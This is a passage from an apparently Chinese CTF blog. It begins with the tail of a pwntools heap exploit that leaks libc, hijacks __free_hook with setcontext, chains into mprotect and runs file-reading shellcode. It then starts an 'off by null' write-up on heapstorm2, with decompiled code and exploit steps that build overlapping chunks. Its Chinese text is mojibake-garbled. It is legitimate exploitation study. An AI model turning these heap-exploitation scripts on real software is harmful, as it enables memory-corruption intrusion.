class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x720</span>-<span class="number">0xcb0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x217</span>)</span><br><span class="line">retire(<span class="number">2</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>)+p64(heap_base+<span class="number">0x1d00</span>)+p64(heap_base+<span class="number">0x17</span>+<span class="number">4</span>)</span><br><span class="line">rename(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>)</span><br><span class="line">rename(<span class="number">2</span>,p64(libc_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">dock(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">setcontext = libc_addr+libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">53</span></span><br><span class="line">dock(p64(setcontext))</span><br><span class="line">ret=libc_addr+<span class="number">0x00000000000008aa</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x215bf</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x0000000000023eea</span></span><br><span class="line">pop_rdx=libc_addr+<span class="number">0x0000000000001b96</span></span><br><span class="line">mprotect_addr=libc_addr+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">rename(<span class="number">0</span>,<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line">flag_addr=heap_base+<span class="number">0x1d10</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;0&#125;</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, &#123;1&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x25</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, &#123;2&#125;</span></span><br><span class="line"><span class="string">mov rdx,0x25</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> .<span class="built_in">format</span>( flag_addr,heap_base+<span class="number">0x48f0</span>,heap_base+<span class="number">0x48f0</span>)</span><br><span class="line">rename(<span class="number">1</span>,asm(shellcode,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">shellcode_addr=heap_base+<span class="number">0x44e0</span></span><br><span class="line">mprotect_rop=p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x6000</span>)+p64(pop_rdx)+p64(<span class="number">7</span>)+p64(mprotect_addr)+p64(shellcode_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">rename(<span class="number">0</span>,mprotect_rop)</span><br><span class="line">rop_addr=heap_base+<span class="number">0x4b10</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">300</span>)</span><br><span class="line">rename(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>+p64(rop_addr)+p64(ret))</span><br><span class="line"></span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/26/off-by-null/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/26/off-by-null/" class="post-title-link" itemprop="url">off by null</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-11-26 16:02:02 / ä¿®æ”¹æ—¶é—´ï¼š16:02:28" itemprop="dateCreated datePublished" datetime="2021-11-26T16:02:02+08:00">2021-11-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="aoff-by-null"><a href="#aoff-by-null" class="headerlink" title="aoff by null"></a>aoff by null</h1><p>ç®€å•åœ°è¯´å°±æ˜¯å †æº¢å‡ºåªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œè€Œä¸”æº¢å‡ºçš„è¿™ä¸ªå­—èŠ‚æ˜¯\x00,å¦‚æœæˆ‘ä»¬ç”³è¯·çš„å †æ˜¯ä»¥8ç»“æŸçš„ï¼Œé‚£å°±åˆšå¥½å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º\x00</p>
<p>è¿™ä¸ªæ¼æ´ä¹Ÿæ˜¯å•ä¸ªè‡ªå·±æ²¡å•¥ç”¨ï¼Œä¸€èˆ¬é…åˆunlinkè¾¾æˆoverlap(å¥½åƒæ˜¯è¿™ä¹ˆå«çš„)ã€‚</p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯freeæ—¶è§¦å‘unlinkä½†æ˜¯ä¸æ˜¯åˆå¹¶è¿™ä¸ªchunkçš„ä¸Šä¸€ä¸ªchunkï¼Œè€Œæ˜¯åˆå¹¶ä¸Šä¸Šä¸ªchunkï¼Œè¿™æ ·æ–°åˆå¹¶çš„chunké‡Œå°±å«æœ‰ä¸€ä¸ªæ²¡æœ‰freeçš„å †ï¼Œæ­¤æ—¶è¿™ä¸ªå †è¿˜æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä»–ï¼Œç„¶åå†æŠŠä»–ç”³è¯·å‡ºæ¥ï¼Œè¿™æ ·å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘ä»–äº†ï¼Œæ„æˆäº†ufa</p>
<p>å°±ç”¨heapstorm2æ¥å®ç°offbynull</p>
<p>ä¸‹é¢æ˜¯æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D92</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Allocate&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Update&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Delete&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. View&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Command: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿™æ˜¯å‡ ä¸ªåŠŸèƒ½</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_BCC(a1, *(_QWORD *)(<span class="number">16</span> * (i + <span class="number">2LL</span>) + a1 + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_1551();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">12</span> &amp;&amp; v2 &lt;= <span class="number">4096</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_QWORD *)(<span class="number">16</span> * (i + <span class="number">2LL</span>) + a1 + <span class="number">8</span>) = sub_BCC(a1, v2);</span><br><span class="line">        *(_QWORD *)(<span class="number">16</span> * (i + <span class="number">2LL</span>) + a1) = sub_BB0(a1, v3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Chunk %d Allocated\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Size&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">update</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">15</span> || !sub_BCC(a1, a1[<span class="number">2</span> * v2 + <span class="number">5</span>]) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  v3 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> || v3 &gt; (<span class="keyword">unsigned</span> __int64)(sub_BCC(a1, a1[<span class="number">2</span> * v2 + <span class="number">5</span>]) - <span class="number">12</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Size&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  v4 = sub_BB0(a1, a1[<span class="number">2</span> * v2 + <span class="number">4</span>]);</span><br><span class="line">  sub_1377(v4, v3);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(v3 + v4), <span class="string">&quot;HEAPSTORM_II&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Chunk %d Updated\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">free</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v3 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">15</span> || !sub_BCC(a1, *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1 + <span class="number">8</span>)) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index&quot;</span>);</span><br><span class="line">  v2 = (<span class="keyword">void</span> *)sub_BB0(a1, *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1));</span><br><span class="line">  <span class="built_in">free</span>(v2);</span><br><span class="line">  *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1) = sub_BB0(a1, <span class="number">0LL</span>);</span><br><span class="line">  *(_QWORD *)(<span class="number">16</span> * (v3 + <span class="number">2LL</span>) + a1 + <span class="number">8</span>) = sub_BCC(a1, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Chunk %d Deleted\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">show</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1[<span class="number">3</span>] ^ a1[<span class="number">2</span>]) != <span class="number">322401073LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Permission denied&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v4 = sub_1551();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt; <span class="number">15</span> || !sub_BCC(a1, a1[<span class="number">2</span> * v4 + <span class="number">5</span>]) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Chunk[%d]: &quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  v2 = sub_BCC(a1, a1[<span class="number">2</span> * v4 + <span class="number">5</span>]);</span><br><span class="line">  v3 = sub_BB0(a1, a1[<span class="number">2</span> * v4 + <span class="number">4</span>]);</span><br><span class="line">  sub_14D4(v3, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_180A);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯å‡ ä¸ªé‡è¦çš„åŠŸèƒ½ï¼Œaddæ˜¯ç”³è¯·ä¸€ä¸ªå †ï¼Œç„¶åæŠŠå †åœ°å€å’Œsizeå¼‚æˆ–ååœ¨å‚¨å­˜åœ¨ç¨‹åºè‡ªå·±ç”³è¯·çš„ä¸€ä¸ªå†…å­˜ç©ºé—´é‡Œï¼ˆç¬¬ä¸€æ¬¡è§åœ°å€å¼‚æˆ–ï¼‰ï¼Œupdateæ˜¯å‘æŒ‡å®šå †é‡Œå†™å…¥ï¼Œä¸è¿‡æœ‰sizeé™åˆ¶ï¼Œåªèƒ½è¾“å…¥size-12ä¸ªå­—ç¬¦ï¼Œç„¶åç¨‹åºè¿˜ä¼šåœ¨è¡¥å……12ä¸ªå­—ç¬¦ï¼Œç„¶åå†è¡¥å……ä¸€ä¸ª\x00ï¼Œè¿™å°±æ„æˆoffbynulläº†ï¼Œfreeä¹Ÿæ²¡ufa.</p>
<p>çœ‹ä¸€ä¸‹ä¿æŠ¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>ä¿æŠ¤å…¨å¼€</p>
<p>å›å½’åˆ†æç¨‹åºæœ¬èº«ï¼Œåˆšåˆ†ææ—¶å‘ç°æœ‰offbynull,å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®Œæˆufa.</p>
<p>å…ˆç”³è¯·å‡ ä¸ªå †</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€çœ‹å†…å­˜æƒ…å†µ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55c8c5183000</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55c8c5183020</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55c8c5183530</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br></pre></td></tr></table></figure>

<p>å¤§è‡´æ€è·¯ï¼ŒæŠŠchunk1åˆ†æˆä¸¤ä¸ªchunkï¼ˆå§‘ä¸”ç§°ä¸ºchunk3å’Œchunk4ï¼‰ï¼Œç„¶ååˆ©ç”¨chunk2åˆå¹¶chunk3</p>
<p>å…ˆç®€å•è¯´ä¸€ä¸‹unlinkæ—¶çš„æ­¥éª¤ï¼Œé¦–å…ˆä¼šåˆ¤æ–­è¿™ä¸ªchunkçš„prev_inuseæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸º0ï¼Œå°±ä»£è¡¨ä¸Šä¸ªchunkæ˜¯ç©ºé—²çš„ï¼Œç„¶åå†é€šè¿‡prev_sizeæ¥ç´¢å¼•åˆ°ä¸Šä¸ªchunkåˆå¹¶ï¼Œåˆå¹¶å®Œåæœ€åçš„sizeå°±æ˜¯è¿™ä¸ªchunkçš„sizeåŠ ä¸Šprev_sizeçš„å€¼ã€‚</p>
<p>ä¸€èˆ¬chunkçš„prev_sizeå°±æ˜¯ä¸Šä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkçš„å¤§å°ï¼Œprev_sizeä¸€èˆ¬åœ¨ä¸Šä¸€ä¸ªchunkè¢«ç”³è¯·æˆ–è€…é‡Šæ”¾æ˜¯æ”¹å˜ï¼Œå¦‚æœæˆ‘ä»¬ä»€ä¹ˆéƒ½ä¸åšï¼Œå½“chunk4è¢«ç”³è¯·ä¸‹æ¥æ—¶ï¼Œprev-sizeå°±æ˜¯0ï¼Œå› ä¸ºchunk4ä¸æ˜¯ç©ºé—²çš„ï¼Œè€Œä¸”prev_inuseæ˜¯1ï¼Œæ ¹æœ¬ä¸ä¼šå‘ç”Ÿunlink,è¦ä½¿prev_sizeä¸€ç›´æ˜¯0x510,é‚£å°±è¦å¯¹chunk1è¿›è¡Œå¸ƒç½®ï¼Œå½“ç”³è¯·chunk3å’Œchunk4æ—¶ä¸ä¼šç´¢å¼•åˆ°prev_sizeæ¥æ”¹å˜ä»–çš„å€¼ï¼Œè¿™å°±æ¶‰åŠå¦ä¸€ä¸ªç´¢å¼•æ–¹å¼äº†ï¼Œå½“ä¸€ä¸ªchunkåœ¨binsä¸Šè¢«ç”³è¯·æ—¶ï¼Œä¼šæ ¹æ®å…¶sizeå€¼ç´¢å¼•åˆ°ä¸‹ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkçš„prev_sizeï¼Œç„¶åæ ¹æ®ç”³è¯·æƒ…å†µæ”¹å˜è¿™ä¸ªprev_sizeçš„å€¼ã€‚</p>
<p>æ€»ç»“ ï¼š.è¦ä½¿prev_inuseä¸º0ï¼Œå…¶æ¬¡prev_size=0x510ä¸æ”¹å˜</p>
<p>è¦å®Œæˆè¿™ä¸¤æ­¥è¦åœ¨å †ä¸Šå¸ƒç½®ä¸¤å¤„åœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯chunk1çš„sizeä½ï¼Œè®©å…¶è¢«ç”³è¯·å›æ¥æ—¶ä¸ç´¢å¼•åˆ°chunk2,å¦ä¸€ä¸ªæ˜¯ä¼ªé€ chunk1çš„prev_size,é€šè¿‡chunk1çš„sizeç´¢å¼•åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œæ”¹å˜ä¼ªé€ çš„prev_sizeï¼ˆæˆ–è®¸è¿˜æœ‰éªŒè¯ï¼‰</p>
<p>å…ˆè®©chunk2çš„prev_inuseä¸º0ï¼Œåªè¦æŠŠchunk1ç»™freeæ‰å°±å¥½äº†ã€‚ç„¶åè¦æ”¹å˜chunk1çš„sizeè®©å…¶ç´¢å¼•åˆ°ä¼ªé€ çš„prev_sizeï¼Œæˆ‘ä»¬å¯ä»¥æŠŠchunk1çš„sizeç”±0x510æ”¹æˆ0x500,åªè¦ä¼ªé€ prev_sizeåˆ°å¯¹åº”ä½ç½®å°±å¥½äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">update(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;s&#x27;</span>*(<span class="number">0x18</span>-<span class="number">12</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment"># 7 overlap</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å®Œæˆäº†overlapï¼Œå¯ä»¥çœ‹ä¸€ä¸‹å†…å­˜æƒ…å†µ</p>
